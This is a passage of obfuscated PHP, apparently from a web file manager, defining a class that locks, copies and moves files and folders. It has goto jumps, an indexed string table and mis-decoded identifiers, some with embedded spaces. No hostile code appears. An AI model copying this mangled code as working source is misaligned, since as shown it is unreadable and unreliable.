<?php
 goto E²έ¶ΘίΑ; f©ΨΠ‚Τε: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ΚΏ­‹Γζ) { $•π―β© =& $_SERVER[γγάψ½]; if (!$this->allowLock()) { return; } $this->_lockCheck($•π―β©[626], $ΚΏ­‹Γζ); $ΪΨΙ = 1; $this->_lockEvent($ΚΏ­‹Γζ, array($•π―β©[627], $•π―β©[628]), $ΪΨΙ); $this->_lockParent($ΚΏ­‹Γζ, array($•π―β©[628]), $ΪΨΙ); $this->_lockEvent($ΚΏ­‹Γζ, array($•π―β©[629], $•π―β©[630]), $ΪΨΙ); $this->_lockCheckEnd($•π―β©[626], $ΚΏ­‹Γζ); } public function lockCopyEnd($¬ζΌο”) { $Έ·΅ΤΘζ =& $_SERVER[γγάψ½]; if (!$this->allowLock()) { return; } $άπΜδΫω = 0; $this->_lockEvent($¬ζΌο”, array($Έ·΅ΤΘζ[627], $Έ·΅ΤΘζ[628]), $άπΜδΫω); $this->_lockParent($¬ζΌο”, array($Έ·΅ΤΘζ[628]), $άπΜδΫω); $this->_lockEvent($¬ζΌο”, array($Έ·΅ΤΘζ[629], $Έ·΅ΤΘζ[630]), $άπΜδΫω); } public function lockWriteStart($®«άΥ½, $Ο•»Ζ£― = '') { $Ύ²ΘδΕ =& $_SERVER[γγάψ½]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ύ²ΘδΕ[627], $®«άΥ½); $ Κγώ = 1; $this->_lockKey($Ύ²ΘδΕ[631] . $®«άΥ½ . $Ύ²ΘδΕ[10] . $Ο•»Ζ£―, $ Κγώ); $this->_lockEvent($®«άΥ½, array($Ύ²ΘδΕ[626], $Ύ²ΘδΕ[628]), $ Κγώ); $this->_lockParent($®«άΥ½, array($Ύ²ΘδΕ[626], $Ύ²ΘδΕ[628]), $ Κγώ); $this->_lockCheckEnd($Ύ²ΘδΕ[627], $®«άΥ½); } public function lockWriteEnd($γ¥ΜΕ, $Ρ€„Ί = '') { $‹ζ°Α =& $_SERVER[γγάψ½]; if (!$this->allowLock()) { return; } $ϋ™Ϊ­€δ = 0; $this->_lockKey($‹ζ°Α[631] . $γ¥ΜΕ . $‹ζ°Α[10] . $Ρ€„Ί, $ϋ™Ϊ­€δ); $this->_lockEvent($γ¥ΜΕ, array($‹ζ°Α[626], $‹ζ°Α[628]), $ϋ™Ϊ­€δ); $this->_lockParent($γ¥ΜΕ, array($‹ζ°Α[626], $‹ζ°Α[628]), $ϋ™Ϊ­€δ); } public function lockMoveStart($ώΩω®®‚) { $‡α΅ΘθΓ =& $_SERVER[γγάψ½]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡α΅ΘθΓ[628], $ώΩω®®‚); $ν§¶π¥ = 1; $this->_lockKey($‡α΅ΘθΓ[632] . $ώΩω®®‚, $ν§¶π¥); $this->_lockEvent($ώΩω®®‚, array($‡α΅ΘθΓ[626], $‡α΅ΘθΓ[627]), $ν§¶π¥); $this->_lockParent($ώΩω®®‚, array($‡α΅ΘθΓ[626], $‡α΅ΘθΓ[628]), $ν§¶π¥); $this->_lockEvent($ώΩω®®‚, array($‡α΅ΘθΓ[633], $‡α΅ΘθΓ[629], $‡α΅ΘθΓ[630]), $ν§¶π¥); $this->_lockCheckEnd($‡α΅ΘθΓ[628], $ώΩω®®‚); } public function lockMoveEnd($ρΦΐτ–Ύ) { $›Ου¦Ζ‚ =& $_SERVER[γγάψ½]; if (!$this->allowLock()) { return; } $ωχ·Ώ = 0; $this->_lockKey($›Ου¦Ζ‚[632] . $ρΦΐτ–Ύ, $ωχ·Ώ); $this->_lockEvent($ρΦΐτ–Ύ, array($›Ου¦Ζ‚[626], $›Ου¦Ζ‚[627]), $ωχ·Ώ); $this->_lockParent($ρΦΐτ–Ύ, array($›Ου¦Ζ‚[626], $›Ου¦Ζ‚[628]), $ωχ·Ώ); $this->_lockEvent($ρΦΐτ–Ύ, array($›Ου¦Ζ‚[633], $›Ου¦Ζ‚[629], $›Ου¦Ζ‚[630]), $ωχ·Ώ); } private function _lockCheck($Δυη™, $ξΤ«ύΎα) { $χότ¦Σ =& $_SERVER[γγάψ½]; $½΄—“τ¤ = $this->sourceInfo($ξΤ«ύΎα); $β–‰ϋ = $Δυη™ . $χότ¦Σ[10] . $ξΤ«ύΎα; $this->_lockTimeStart[$β–‰ϋ] = timeFloat(); if (!is_array($½΄—“τ¤)) { return; } $ƒς‘¥ = LNG($χότ¦Σ[634]); CacheLock::setErrorMsg($χότ¦Σ[176] . htmlspecialchars($½΄—“τ¤[$χότ¦Σ[32]]) . $χότ¦Σ[178] . $ƒς‘¥); $this->_lockKey($β–‰ϋ, 1); $this->_lockKey($β–‰ϋ, 0); $ξΚ™εε = array_reverse($this->parentLevelArray($½΄—“τ¤[$χότ¦Σ[589]])); foreach ($ξΚ™εε as $ΞχΌ) { $β–‰ϋ = $Δυη™ . $χότ¦Σ[635] . $ΞχΌ; if (CacheLock::lockGet($χότ¦Σ[636] . $β–‰ϋ)) { $½΄—“τ¤ = $this->sourceInfo($ΞχΌ); CacheLock::setErrorMsg($χότ¦Σ[176] . htmlspecialchars($½΄—“τ¤[$χότ¦Σ[32]]) . $χότ¦Σ[178] . $ƒς‘¥); $this->_lockKey($β–‰ϋ, 1); $this->_lockKey($β–‰ϋ, 0); } } } private function _lockCheckEnd($Ωλ‘±΄•, $φ΄‡Ώ) { $ –©ηΛ =& $_SERVER[γγάψ½]; $²νΜ™† = $Ωλ‘±΄• . $ –©ηΛ[10] . $φ΄‡Ώ; CacheLock::setErrorMsg($ –©ηΛ[457]); if (!isset($this->_lockTimeStart[$²νΜ™†])) { return; } $­ΕΒΤ» = timeFloat() - $this->_lockTimeStart[$²νΜ™†]; unset($this->_lockTimeStart[$²νΜ™†]); if ($­ΕΒΤ» > 0.5) { unset(self::$cacheSourceInfo[$ –©ηΛ[536] . $φ΄‡Ώ]); } $ιµ³σ = $this->sourceInfo($φ΄‡Ώ); if (!$ιµ³σ) { show_json(LNG($ –©ηΛ[108]), !1); } } private function _lockParent($΄ΰΛ¤ι, $΄βςΧΐ, $ωΪΦ·μΪ) { if (!$this->autoLockSet) { return; } $φ°Χ¥ = $this->sourceInfo($΄ΰΛ¤ι); if (!is_array($φ°Χ¥)) { return; } $έΗ¬…θ = array_reverse($this->parentLevelArray($φ°Χ¥[$_SERVER[γγάψ½][589]])); foreach ($έΗ¬…θ as $­Ί ρΘ) { $this->_lockEvent($­Ί ρΘ, $΄βςΧΐ, $ωΪΦ·μΪ); } } private function _lockEvent($δυνκχ‹, $ώΏΡΕ¶, $λ°΄όρ) { $³¤»΄΅ =& $_SERVER[γγάψ½]; if (!$this->autoLockSet) { return; } foreach ($ώΏΡΕ¶ as $π…Γκ±Ώ) { $Νδο²τΗ = $π…Γκ±Ώ . $³¤»΄΅[10] . $δυνκχ‹; if ($λ°΄όρ && CacheLock::lockGet($³¤»΄΅[636] . $Νδο²τΗ)) { continue; } $this->_lockKey($Νδο²τΗ, $λ°΄όρ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($βƒ€ηΣ, $έήΩΐ™ό = 1) { $ΑαΘ–ν = $_SERVER[γγάψ½][636] . md5($βƒ€ηΣ); if ($έήΩΐ™ό) { if (isset(self::$_lockItemArr[$ΑαΘ–ν])) { return; } self::$_lockItemArr[$ΑαΘ–ν] = 1; CacheLock::lock($ΑαΘ–ν, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ΑαΘ–ν])) { return; } unset(self::$_lockItemArr[$ΑαΘ–ν]); CacheLock::unlock($ΑαΘ–ν); } } public function isParentOf($υ†αχ, $¤®ΓΥωΥ) { $Ϊ―ΡσΖ =& $_SERVER[γγάψ½]; $Σ™νΜΔ· = $this->sourceInfo($υ†αχ); $ϊ®ƒπΦµ = $this->sourceInfo($¤®ΓΥωΥ); $ΆΟ§Γ  = $Σ™νΜΔ·[$Ϊ―ΡσΖ[589]] . $Σ™νΜΔ·[$Ϊ―ΡσΖ[194]] . $Ϊ―ΡσΖ[50]; $•—Α = $ϊ®ƒπΦµ[$Ϊ―ΡσΖ[589]] . $ϊ®ƒπΦµ[$Ϊ―ΡσΖ[194]] . $Ϊ―ΡσΖ[50]; $‹ϊΪΖΝ– = strpos($•—Α, $ΆΟ§Γ ) === 0; return $‹ϊΪΖΝ–; } private $targetIsDelete = 0; public function copy($ώ‹®ξ, $ΑΣωΝρθ, $²γΨιΟρ = REPEAT_REPLACE, $ο€ΝΦε = '') { $΄©―Ό¬ =& $_SERVER[γγάψ½]; $„¬ϋ΅–Λ = $this->sourceInfo($ώ‹®ξ); $νάβ‘ = $this->sourceInfo($ΑΣωΝρθ); if (!$„¬ϋ΅–Λ || !$νάβ‘ || $νάβ‘[$΄©―Ό¬[488]] != $΄©―Ό¬[91]) { return !1; } if ($this->isParentOf($ώ‹®ξ, $ΑΣωΝρθ)) { return !1; } $Ϋ’¥τ΄£ = $ο€ΝΦε ? $ο€ΝΦε : $„¬ϋ΅–Λ[$΄©―Ό¬[32]]; $this->lockCopyStart($ώ‹®ξ); $this->lockWriteStart($ΑΣωΝρθ, $Ϋ’¥τ΄£); $τϊμχΎ¶ = array($΄©―Ό¬[637] => array(), $΄©―Ό¬[638] => array(), $΄©―Ό¬[639] => array()); $this->targetIsDelete = intval($„¬ϋ΅–Λ[$΄©―Ό¬[508]]); $τΑΐΊ° = $this->fileNameExistAuto($ΑΣωΝρθ, $„¬ϋ΅–Λ); $ΣΆΈ©ο = $this->_copy($ώ‹®ξ, $ΑΣωΝρθ, $²γΨιΟρ, $τϊμχΎ¶, !0, $ο€ΝΦε); $this->_childrenListClear(); $this->lockCopyEnd($ώ‹®ξ); $this->lockWriteEnd($ΑΣωΝρθ, $Ϋ’¥τ΄£); if ($„¬ϋ΅–Λ[$΄©―Ό¬[488]] == $΄©―Ό¬[91] && $τΑΐΊ° == $ΣΆΈ©ο) { $this->folderSizeResetChildren($τΑΐΊ°); } Model($΄©―Ό¬[640])->addAll($τϊμχΎ¶[$΄©―Ό¬[638]], array(), !0); if ($τΑΐΊ° != $ΣΆΈ©ο || $„¬ϋ΅–Λ[$΄©―Ό¬[488]] == $΄©―Ό¬[91]) { Model($΄©―Ό¬[641])->eventCopy($ΣΆΈ©ο); } $this->saveAll($τϊμχΎ¶[$΄©―Ό¬[639]]); Model($΄©―Ό¬[233])->linkAdd($τϊμχΎ¶[$΄©―Ό¬[637]]); $this->folderSizeReset($ΑΣωΝρθ); $this->updateModifyTime($ΑΣωΝρθ); return $ΣΆΈ©ο; } private function _copy($ί–Ζγϊ, $ΗήΫ¨ς, $–Ϊ–ΔΒ, &$Θ·ν›™ί, $ΛΑΖΣτ, $χΜ…‰ε = '') { $¦ιΎΆα =& $_SERVER[γγάψ½]; $ΜΖψΒ = $this->sourceInfoCache($ί–Ζγϊ); $μ ξςύέ = $ΜΖψΒ[$¦ιΎΆα[488]] == $¦ιΎΆα[91]; $θΎΌ•² = $χΜ…‰ε ? $χΜ…‰ε : $ΜΖψΒ[$¦ιΎΆα[32]]; $ΐ±φιΤ = $this->fileNameExistAuto($ΗήΫ¨ς, $ΜΖψΒ); if ($ΛΑΖΣτ) { $this->_childrenAllMake($ί–Ζγϊ); if ($μ ξςύέ && $ΐ±φιΤ) { $this->_childrenAllMake($ΐ±φιΤ); } } if (!$ΐ±φιΤ) { return $this->_copyCreate($ί–Ζγϊ, $ΗήΫ¨ς, $θΎΌ•², $Θ·ν›™ί); } $Υ½νΞΛ = $ΐ±φιΤ; if ($μ ξςύέ) { if ($–Ϊ–ΔΒ == REPEAT_RENAME_FOLDER) { $θΎΌ•² = $this->fileNameAutoCache($ΗήΫ¨ς, $θΎΌ•², $–Ϊ–ΔΒ, $μ ξςύέ); $Υ½νΞΛ = $this->_copyCreate($ί–Ζγϊ, $ΗήΫ¨ς, $θΎΌ•², $Θ·ν›™ί); } else { $ΰΡΒά–Ώ = $this->_childrenList($ί–Ζγϊ); foreach ($ΰΡΒά–Ώ as $Μ £Τ) { $this->_copy($Μ £Τ[$¦ιΎΆα[194]], $ΐ±φιΤ, $–Ϊ–ΔΒ, $Θ·ν›™ί, !1); } } } else { if ($–Ϊ–ΔΒ == REPEAT_RENAME || $–Ϊ–ΔΒ == REPEAT_RENAME_FOLDER) { $θΎΌ•² = $this->fileNameAutoCache($ΗήΫ¨ς, $θΎΌ•², $–Ϊ–ΔΒ, $μ ξςύέ); $Υ½νΞΛ = $this->_copyCreate($ί–Ζγϊ, $ΗήΫ¨ς, $θΎΌ•², $Θ·ν›™ί); } else { if ($–Ϊ–ΔΒ == REPEAT_REPLACE) { $ΜίΆΕ Ϋ = $this->sourceInfoCache($ΐ±φιΤ); $ϋ€ψβρ = $this->fileHistory($ΜίΆΕ Ϋ, $ΜΖψΒ[$¦ιΎΆα[546]], $ΜΖψΒ[$¦ιΎΆα[79]]); if ($ϋ€ψβρ) { $Θ·ν›™ί[$¦ιΎΆα[637]][] = $ΜΖψΒ[$¦ιΎΆα[546]]; } } else { if ($–Ϊ–ΔΒ == REPEAT_SKIP) { } } } Hook::trigger($¦ιΎΆα[642], array($¦ιΎΆα[643], $ΜΖψΒ, 0)); } return $Υ½νΞΛ; } private function _copyCreate($ΐ«ƒΝε€, $Λ‰Ί, $–Όχ«„, &$‹ηύλ¥ρ) { $ΝΧ•δ—· =& $_SERVER[γγάψ½]; $ό©ΤΣΛ = $this->sourceInfoCache($ΐ«ƒΝε€); $µΩ ©”μ = $this->sourceInfoCache($Λ‰Ί); $‘ω™ΖΧη = $this->_makeItemData($ό©ΤΣΛ, $µΩ ©”μ, $–Όχ«„); Hook::trigger($ΝΧ•δ—·[644], $‘ω™ΖΧη); Hook::trigger($ΝΧ•δ—·[645], array($ΝΧ•δ—·[646], $‘ω™ΖΧη, 0)); $ΎϊΟ„ = $this->add($‘ω™ΖΧη); $ΞΜπψά = array($ΝΧ•δ—·[194] => $ΎϊΟ„, $ΝΧ•δ—·[32] => $–Όχ«„); $this->_copyApplyMeta($ΞΜπψά, $‹ηύλ¥ρ); if ($ό©ΤΣΛ[$ΝΧ•δ—·[488]] != $ΝΧ•δ—·[91]) { $‹ηύλ¥ρ[$ΝΧ•δ—·[637]][] = $ό©ΤΣΛ[$ΝΧ•δ—·[546]]; return $ΎϊΟ„; } $ϊ¬‹Σα = array(); $η‹ΕΈ = array(); $this->_childrenListAll($ΐ«ƒΝε€, $ϊ¬‹Σα); $Ίόϋ¤ = count($ϊ¬‹Σα); if ($Ίόϋ¤ == 0) { return $ΎϊΟ„; } $έ•ίµώΣ = $this->sourceInfo($ΎϊΟ„); foreach ($ϊ¬‹Σα as $¤‹ςκσ—) { $―ϊ¶ΐΪΨ = $this->_makeItemData($¤‹ςκσ—, $έ•ίµώΣ, $¤‹ςκσ—[$ΝΧ•δ—·[32]]); $―ϊ¶ΐΪΨ[$ΝΧ•δ—·[589]] = $¤‹ςκσ—[$ΝΧ•δ—·[589]]; $η‹ΕΈ[] = $―ϊ¶ΐΪΨ; } $this->chunkEventSet($ΝΧ•δ—·[647], array($ΝΧ•δ—·[648], $‘ω™ΖΧη, $Ίόϋ¤)); $this->addAll($η‹ΕΈ, array(), !1); $Κιώ¶ξ¥ = $this->where(array($ΝΧ•δ—·[193] => $ΎϊΟ„))->select(); $·­° = $this->_childrenMakeRelation($ϊ¬‹Σα, $Κιώ¶ξ¥); $·­°[$ΐ«ƒΝε€] = $ΎϊΟ„; $Αχ¬ΠΊα = array(); $ί πϊΛ± = array(); foreach ($Κιώ¶ξ¥ as $¤‹ςκσ—) { $£€βυΔ¬ = $¤‹ςκσ—[$ΝΧ•δ—·[194]]; $‚•„™Ά = $this->_childrenMatch($·­°, $¤‹ςκσ—, $έ•ίµώΣ); $Αχ¬ΠΊα[] = array($ΝΧ•δ—·[194], $£€βυΔ¬, $ΝΧ•δ—·[193], $‚•„™Ά[$ΝΧ•δ—·[193]]); $ί πϊΛ±[] = array($ΝΧ•δ—·[194], $£€βυΔ¬, $ΝΧ•δ—·[589], $‚•„™Ά[$ΝΧ•δ—·[589]]); $this->_copyApplyMeta($¤‹ςκσ—, $‹ηύλ¥ρ); if ($¤‹ςκσ—[$ΝΧ•δ—·[488]] != $ΝΧ•δ—·[91]) { $‹ηύλ¥ρ[$ΝΧ•δ—·[637]][] = $¤‹ςκσ—[$ΝΧ•δ—·[546]]; } } $this->chunkEventSet($ΝΧ•δ—·[649], array($ΝΧ•δ—·[650], $‘ω™ΖΧη, $Ίόϋ¤)); $this->saveAll($Αχ¬ΠΊα); $this->chunkEventSet($ΝΧ•δ—·[651], array($ΝΧ•δ—·[652], $‘ω™ΖΧη, $Ίόϋ¤)); $this->saveAll($ί πϊΛ±); return $ΎϊΟ„; } private function _childrenMakeRelation($ϊ‰υ½χζ, $ώκ¶Ά¬) { $ύηΨδάέ =& $_SERVER[γγάψ½]; $ζέ”Έ™ = array(); $­Γ™ΐΓ = array(); foreach ($ϊ‰υ½χζ as $εΫΒαΝ) { $ΨεΛ­β  = $εΫΒαΝ[$ύηΨδάέ[32]] . $ύηΨδάέ[8] . $εΫΒαΝ[$ύηΨδάέ[589]]; $ζέ”Έ™[$ΨεΛ­β ] = $εΫΒαΝ[$ύηΨδάέ[194]]; } foreach ($ώκ¶Ά¬ as $εΫΒαΝ) { $ΨεΛ­β  = $εΫΒαΝ[$ύηΨδάέ[32]] . $ύηΨδάέ[8] . $εΫΒαΝ[$ύηΨδάέ[589]]; $υΩΠΐ™ = $ζέ”Έ™[$ΨεΛ­β ]; $­Γ™ΐΓ[$υΩΠΐ™] = $εΫΒαΝ[$ύηΨδάέ[194]]; } return $­Γ™ΐΓ; } private function _childrenMatch($Έλ³­ΐ«, $½μ§¥ζ¬, $φΖ‹δε) { $¥Γβ¶΄Δ =& $_SERVER[γγάψ½]; $ΩνΆ‚υ = $φΖ‹δε[$¥Γβ¶΄Δ[589]]; $ΥΡΝο = $this->parentLevelArray($½μ§¥ζ¬[$¥Γβ¶΄Δ[589]]); foreach ($ΥΡΝο as $£ωΰ¶±ύ) { if (isset($Έλ³­ΐ«[$£ωΰ¶±ύ])) { $ΩνΆ‚υ .= $Έλ³­ΐ«[$£ωΰ¶±ύ] . $¥Γβ¶΄Δ[653]; } } $ΩνΆ‚υ = rtrim($ΩνΆ‚υ, $¥Γβ¶΄Δ[50]) . $¥Γβ¶΄Δ[50]; $ηΧ»΄¤η = $this->parentLevelArray($ΩνΆ‚υ); $Ξύ = $ηΧ»΄¤η[count($ηΧ»΄¤η) - 1]; return array($¥Γβ¶΄Δ[193] => $Ξύ, $¥Γβ¶΄Δ[589] => $ΩνΆ‚υ); } private function _makeItemData($Ωφ—€ΛΚ, $ΏώρΑΫΦ, $Χταξ§) { $ρ΄Σηκπ =& $_SERVER[γγάψ½]; $χ°µ³Β® = array($ρ΄Σηκπ[654] => $Ωφ—€ΛΚ[$ρ΄Σηκπ[488]], $ρ΄Σηκπ[497] => $Χταξ§, $ρ΄Σηκπ[655] => $Ωφ—€ΛΚ[$ρ΄Σηκπ[489]] ? $Ωφ—€ΛΚ[$ρ΄Σηκπ[489]] : $ρ΄Σηκπ[12], $ρ΄Σηκπ[547] => $Ωφ—€ΛΚ[$ρ΄Σηκπ[546]] ? $Ωφ—€ΛΚ[$ρ΄Σηκπ[546]] : 0, $ρ΄Σηκπ[625] => $Ωφ—€ΛΚ[$ρ΄Σηκπ[79]] ? $Ωφ—€ΛΚ[$ρ΄Σηκπ[79]] : 0, $ρ΄Σηκπ[656] => intval($ΏώρΑΫΦ[$ρ΄Σηκπ[191]]), $ρ΄Σηκπ[657] => intval($ΏώρΑΫΦ[$ρ΄Σηκπ[574]]), $ρ΄Σηκπ[658] => intval(USER_ID), $ρ΄Σηκπ[659] => intval(USER_ID), $ρ΄Σηκπ[480] => intval($ΏώρΑΫΦ[$ρ΄Σηκπ[194]]), $ρ΄Σηκπ[660] => $ΏώρΑΫΦ[$ρ΄Σηκπ[589]] . $ΏώρΑΫΦ[$ρ΄Σηκπ[194]] . $ρ΄Σηκπ[50], $ρ΄Σηκπ[501] => $Ωφ—€ΛΚ[$ρ΄Σηκπ[88]] ? $Ωφ—€ΛΚ[$ρ΄Σηκπ[88]] : time(), $ρ΄Σηκπ[507] => 0, $ρ΄Σηκπ[661] => $ρ΄Σηκπ[12]); return $χ°µ³Β®; } private function _copyApplyMeta($±Έ‚αΥ£, &$κ‹•’΅Ι) { $§ ¥ε“ =& $_SERVER[γγάψ½]; $°‰Ώδό = $±Έ‚αΥ£[$§ ¥ε“[194]]; $¥„…ν = $±Έ‚αΥ£[$§ ¥ε“[32]]; if (!isset($±Έ‚αΥ£[$§ ¥ε“[662]]) || !$±Έ‚αΥ£[$§ ¥ε“[662]] || $±Έ‚αΥ£[$§ ¥ε“[662]] == $§ ¥ε“[231]) { $κ‹•’΅Ι[$§ ¥ε“[639]][] = array($§ ¥ε“[194], $°‰Ώδό, $§ ¥ε“[662], short_id($°‰Ώδό)); } if (Input::check($¥„…ν, $§ ¥ε“[663])) { $κ‹•’΅Ι[$§ ¥ε“[638]][] = array($§ ¥ε“[194] => $°‰Ώδό, $§ ¥ε“[97] => $§ ¥ε“[541], $§ ¥ε“[453] => str_replace($§ ¥ε“[53], $§ ¥ε“[12], Pinyin::get($¥„…ν))); $κ‹•’΅Ι[$§ ¥ε“[638]][] = array($§ ¥ε“[194] => $°‰Ώδό, $§ ¥ε“[97] => $§ ¥ε“[540], $§ ¥ε“[453] => Pinyin::get($¥„…ν, $§ ¥ε“[664])); } $κ‹•’΅Ι[$§ ¥ε“[638]][] = array($§ ¥ε“[194] => $°‰Ώδό, $§ ¥ε“[97] => $§ ¥ε“[520], $§ ¥ε“[453] => KodSort::makeStr($¥„…ν)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ΣΗωΑ‡τ) { $λ„Χμ’ =& $_SERVER[γγάψ½]; $ΊΧΟ―ƒ = $this->sourceInfo($ΣΗωΑ‡τ); $―χςωαε = $λ„Χμ’[665]; $–δ…ΊΠλ = array($λ„Χμ’[589] => array($λ„Χμ’[620], $ΊΧΟ―ƒ[$λ„Χμ’[589]] . $ΣΗωΑ‡τ . $λ„Χμ’[621]), $λ„Χμ’[508] => $this->targetIsDelete); $¨σΜ’Ιέ = $this->field($―χςωαε)->where($–δ…ΊΠλ)->select(); if (!$¨σΜ’Ιέ) { return; } $¨σΜ’Ιέ = array_to_keyvalue($¨σΜ’Ιέ, $λ„Χμ’[194]); foreach ($¨σΜ’Ιέ as $΄‹ά‰λ) { $ΑΚ΅µ½Ν = $΄‹ά‰λ[$λ„Χμ’[193]]; $ΣΗωΑ‡τ = $΄‹ά‰λ[$λ„Χμ’[194]]; if (!isset($this->_childrenListCache[$ΣΗωΑ‡τ]) && $΄‹ά‰λ[$λ„Χμ’[488]] == $λ„Χμ’[91]) { $this->_childrenListCache[$ΣΗωΑ‡τ] = array(); } if (!isset($this->_childrenListCache[$ΑΚ΅µ½Ν])) { $this->_childrenListCache[$ΑΚ΅µ½Ν] = array(); } $this->_childrenListCache[$ΑΚ΅µ½Ν][$ΣΗωΑ‡τ] = $΄‹ά‰λ; $this->_childrenItemCache[$ΣΗωΑ‡τ] = $΄‹ά‰λ; } } private function _childrenListAll($ΦƒΫΔΗγ, &$£Ψ·θ®) { $–ξ·ƒ“ό =& $_SERVER[γγάψ½]; if (!isset($this->_childrenListCache[$ΦƒΫΔΗγ])) { return; } $δΆ»Κ¤Η = $this->_childrenListCache[$ΦƒΫΔΗγ]; foreach ($δΆ»Κ¤Η as $ϊϋΏ¤ίζ => $μ–§ƒΕΆ) { $£Ψ·θ®[$ϊϋΏ¤ίζ] = $μ–§ƒΕΆ; if ($μ–§ƒΕΆ[$–ξ·ƒ“ό[488]] == $–ξ·ƒ“ό[91]) { $this->_childrenListAll($ϊϋΏ¤ίζ, $£Ψ·θ®); } } } private function sourceInfoCache($ΨΒΫ΅½‚) { if (isset($this->_childrenItemCache[$ΨΒΫ΅½‚])) { return $this->_childrenItemCache[$ΨΒΫ΅½‚]; } return $this->sourceInfo($ΨΒΫ΅½‚); } private function _childrenList($τέΈ…η) { if (isset($this->_childrenListCache[$τέΈ…η])) { return $this->_childrenListCache[$τέΈ…η]; } return $this->_childrenListSelect($τέΈ…η); } private function _childrenListSelect($ϊ†”τΑ) { $Νύ¶–“Ϊ =& $_SERVER[γγάψ½]; $χ†ϋµ«Β = array($Νύ¶–“Ϊ[193] => $ϊ†”τΑ, $Νύ¶–“Ϊ[508] => $this->targetIsDelete); $ϊΙΔθ„± = $this->where($χ†ϋµ«Β)->select(); $ϊΙΔθ„± = $ϊΙΔθ„± ? $ϊΙΔθ„± : array(); $½‚ζά¬ = array_to_keyvalue($ϊΙΔθ„±, $Νύ¶–“Ϊ[194]); $this->_childrenListCache[$ϊ†”τΑ] = $½‚ζά¬; foreach ($½‚ζά¬ as $ϊ†”τΑ => $‹―ΊΣ) { $this->_childrenItemCache[$ϊ†”τΑ] = $‹―ΊΣ; } return $½‚ζά¬; } private function fileNameExistAuto($‚ξ¶·°Υ, $­ίε»ΉΕ) { $Δχυσ« =& $_SERVER[γγάψ½]; if ($­ίε»ΉΕ[$Δχυσ«[508]] == $Δχυσ«[91]) { return $this->fileNameExist($‚ξ¶·°Υ, $­ίε»ΉΕ[$Δχυσ«[32]]); } return $this->fileNameExistCache($‚ξ¶·°Υ, $­ίε»ΉΕ[$Δχυσ«[32]]); } private function fileNameExistCache($Υ“ΐίΑ, $ΥλθΏ) { $Ψ­Σ =& $_SERVER[γγάψ½]; $ΥλθΏ = strtolower($ΥλθΏ); $—Θϊλϋ = $this->_childrenList($Υ“ΐίΑ); foreach ($—Θϊλϋ as $δΩιτέθ) { if ($ΥλθΏ == strtolower($δΩιτέθ[$Ψ­Σ[32]])) { return $δΩιτέθ[$Ψ­Σ[194]]; } } return !1; } private function fileNameAutoCache($νϊϋσ, $ίά΄¬ζΨ, $όµβήλ…, $Α„―¦μΟ) { $™Ξ Ήβ— =& $_SERVER[γγάψ½]; $·—•Ώΰ² = $this->_childrenList($νϊϋσ); $ζοό¥Κζ = array_to_keyvalue($·—•Ώΰ², $™Ξ Ήβ—[12], $™Ξ Ήβ—[32]); return $this->fileNameAutoGet($ζοό¥Κζ, $ίά΄¬ζΨ, $όµβήλ…, $Α„―¦μΟ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Πζ£Σν, $’κΗθΪ, $Ξή¦ΐ = REPEAT_REPLACE, $—Ξβ¨λ = '') { $‡¶ΣΎ“κ =& $_SERVER[γγάψ½]; $ήΤ–†ΩΝ = $this->sourceInfo($Πζ£Σν); $λ€ΖΦΙ = $this->sourceInfo($’κΗθΪ); if ($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[193]] == $λ€ΖΦΙ[$‡¶ΣΎ“κ[194]]) { if ($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[508]] == $‡¶ΣΎ“κ[91]) { Model($‡¶ΣΎ“κ[506])->restore(array($Πζ£Σν)); } if (!$—Ξβ¨λ || $—Ξβ¨λ == $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[32]]) { return $Πζ£Σν; } } $”“·σ† = $this->pathInfoMore($Πζ£Σν); if ($this->isParentOf($Πζ£Σν, $’κΗθΪ)) { return !1; } if (!$ήΤ–†ΩΝ || !$λ€ΖΦΙ || $λ€ΖΦΙ[$‡¶ΣΎ“κ[488]] != $‡¶ΣΎ“κ[91]) { return !1; } Hook::trigger($‡¶ΣΎ“κ[666], $”“·σ†); $this->targetIsDelete = intval($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[508]]); if ($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[193]] == $’κΗθΪ && $—Ξβ¨λ != $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[32]]) { $ή»·χΓ = $this->fileNameExist($’κΗθΪ, $—Ξβ¨λ); if ($ή»·χΓ && $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[488]] == $‡¶ΣΎ“κ[231]) { $νΐ‰° = $this->sourceInfo($ή»·χΓ); $ΗΟ‘®‡ = $this->fileHistory($νΐ‰°, $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[546]], $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[79]]); if (!$ΗΟ‘®‡) { Model($‡¶ΣΎ“κ[549])->remove($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[546]]); } $this->removeNow($Πζ£Σν, !1); $this->folderSizeReset($’κΗθΪ); Hook::trigger($‡¶ΣΎ“κ[667], $”“·σ†); return $ή»·χΓ; } } $»›ήΦ‚ά = $—Ξβ¨λ ? $—Ξβ¨λ : $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[32]]; $this->lockMoveStart($Πζ£Σν); $this->lockWriteStart($’κΗθΪ, $»›ήΦ‚ά); $ΐΉβ‘λ = array($‡¶ΣΎ“κ[637] => array(), $‡¶ΣΎ“κ[668] => !1); $this->clearShare($Πζ£Σν, $’κΗθΪ); $‚™ζυ΄Ό = $this->fileNameExistAuto($’κΗθΪ, $ήΤ–†ΩΝ); $Ίιαό‘  = $this->_move($Πζ£Σν, $’κΗθΪ, $Ξή¦ΐ, $ΐΉβ‘λ, $—Ξβ¨λ); $this->sourceCacheClear(); if ($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[488]] == $‡¶ΣΎ“κ[91] && $‚™ζυ΄Ό) { $this->folderSizeResetChildren($Ίιαό‘ ); } 